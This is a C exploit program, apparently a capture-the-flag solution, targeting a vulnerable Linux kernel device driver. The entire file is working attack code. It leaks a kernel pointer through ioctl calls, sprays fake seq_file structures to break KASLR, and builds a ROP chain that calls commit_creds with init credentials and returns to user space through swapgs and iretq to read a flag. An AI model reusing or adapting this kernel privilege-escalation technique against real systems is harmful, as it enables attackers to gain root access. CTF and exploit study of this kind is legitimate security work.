#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <malloc.h>

#define CMD_READ    0x1337
#define CMD_WRITE   0x1338

#define KERNEL_BASE 0xffffffff81000000
#define KASLR_ADJUST(addr, kaslr) ((kaslr) + (addr - KERNEL_BASE))

typedef struct {
  int fd;
  long val;
} req_t;

typedef struct {
  char *buf;
  size_t size;
  size_t from;
  size_t count;
  size_t pad_until;
  long long index;
  long long read_pos;
  uint64_t lock[4];
  void *ops;
  int poll_event;
  void *file;
  void *private;
} seq_t;

// This function will be executed when the `iretq` instruction is called
void open_sh(){
  int fd = open("/dev/sdb", 0);
  char buf[0x100];
  read(fd, buf, 0x100);
  printf("[*] Got the flag: %s\n", buf);
  sleep(100000);
}

// Necessary registers for executing `iretq`
unsigned long u_cs;
unsigned long u_ss;
unsigned long u_rsp;
unsigned long u_rflags;
void save_state(){
  __asm__(
    ".intel_syntax noprefix;"
    "mov u_cs, cs;"
    "mov u_ss, ss;"
    "mov u_rsp, rsp;"
    "pushf;"
    "pop u_rflags;"
    ".att_syntax prefix"
    );
}

typedef struct {
  void *start;
  void *stop;
  void *next;
  void *show;
} ops_t;


int open_sys_file() {
  int fd = open("/proc/self/maps", O_RDONLY);
  if (fd < 0) {
    perror("open");
    return -1;
  }
  return fd;
}


int main() {
  printf("Opening vulnerable device...\n");
  int vuln_fd = open("/dev/vuln", O_RDWR);
  if (vuln_fd < 0) {
    perror("open");
    return 1;
  }

  printf("Opening /proc/self/maps...\n");
  int fd = open_sys_file();

  req_t request = {fd, 0};
  printf("Sending ioctl to read from sys file\n");
  if (ioctl(vuln_fd, CMD_READ, &request) < 0) {
    perror("ioctl");
    return 1;
  }

  uint64_t leak_addr = request.val;
  printf("Private data leak = 0x%lx\n", request.val);

  uint64_t leak_page = leak_addr & ~0xfff;
  uint64_t offset = 0x83d000; //0x23e8000; //0xb80000;
  uint64_t fake_seq_addr = leak_page + offset;

  size_t flag_addr = 0xfffffe0000000004;

  // Spray fake seq structures
  seq_t fake_seq = {(void *)flag_addr, 0x100, 0, 0, 0, 0, 0, NULL, (void *)0xdeadbeefcafebabe, 0, NULL, (void *)0xdeadbeefcafebabe};
  fake_seq.buf = (void *)flag_addr;
  fake_seq.from = 0;
  fake_seq.count = 0x1000;
  fake_seq.size = 0x1000;
  fake_seq.read_pos = 1;
  fake_seq.private = (void *)fake_seq_addr+0x100;


  seq_t **spray_pages = malloc(8000 * 8);

  for (int i = 0; i < 8000; i++) {
    seq_t *spray = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    spray_pages[i] = spray;
    if (spray == MAP_FAILED) {
      perror("mmap");
      return 1;
    }
    memcpy((void *)spray, (void *)&fake_seq, sizeof(seq_t));
  }

  puts("Finished spray");

  request.val = fake_seq_addr;
  printf("Overwriting private_data with %p\n", (void *)request.val);
  if ( ioctl(vuln_fd, CMD_WRITE, &request) < 0) {
    perror("ioctl");
    return 1;
  }

  char flag_buf[0x100] = {0};
  lseek(fd, 1, SEEK_SET);
  read(fd, (void *)flag_buf, 0x100);

  uint64_t kaslr = *((uint64_t*)flag_buf)-0x8e00;

  printf("LEAK %lx\n", kaslr);

  ////////////////////////////////////////////////////////////////////////////

  // Spray fake ctl_table structures
  ops_t fake_ops = {
      (void *)(kaslr+0xffffffff814b1a35-0xffffffff81000000),
      (void *)0xAAAAAAAAAAAAAAAA,
      (void *)0xAAAAAAAAAAAAAAAA,
      (void *)0xAAAAAAAAAAAAAAAA
  };
  seq_t fake_seq_new = {(void*)1, 0x100, 0, 0, 0, 0, 0, NULL, NULL, 0, NULL, NULL};
  fake_seq_new.read_pos = 0x101;
  fake_seq.private = (void *)fake_seq_addr+0x100;

  uint64_t *rop = (uint64_t*)&fake_seq_new;
  fake_seq_new.ops = (void*)fake_seq_addr+0x160;

  save_state();

  uint64_t shift_stack_up = KASLR_ADJUST(0xffffffff818d5ed8, kaslr); // add rsp, 0x178; pop rbx; pop r12; pop r13; pop rbp; ret;
  uint64_t pop_rdi_ret = KASLR_ADJUST(0xffffffff81845e46, kaslr); // pop rdi; ret;
  uint64_t cred_struct = KASLR_ADJUST(0xffffffff81e3bf60, kaslr); // cred struct from init_task
  uint64_t commit_creds = KASLR_ADJUST(0xffffffff812a3a90, kaslr); // commit_creds
  uint64_t swapgs_ret = KASLR_ADJUST(0xffffffff819ed458, kaslr); // swapgs; ret;
  uint64_t iretq = KASLR_ADJUST(0xffffffff8100180e, kaslr); // iretq;

  for (int i = 0; i < 8000; i++) {
    memcpy((void *)spray_pages[i], (void *)&fake_seq_new, sizeof(seq_t));
    memcpy((void *)spray_pages[i] + sizeof(seq_t) + 0x100-0x18, (void *)&fake_ops, sizeof(ops_t));
    int idx = 0x35;
    rop = (seq_t*)spray_pages[i];
    rop[1] = shift_stack_up;
    rop[idx++] = pop_rdi_ret;
    rop[idx++] = cred_struct;
    rop[idx++] = commit_creds;
    rop[idx++] = swapgs_ret;
    rop[idx++] = iretq;
    rop[idx++] = (uint64_t)open_sh;
    rop[idx++] = u_cs;
    rop[idx++] = u_rflags;
    rop[idx++] = u_rsp;
    rop[idx++] = u_ss;
  }

  read(fd, (void *)flag_buf, 0x100);

  return 0;
}
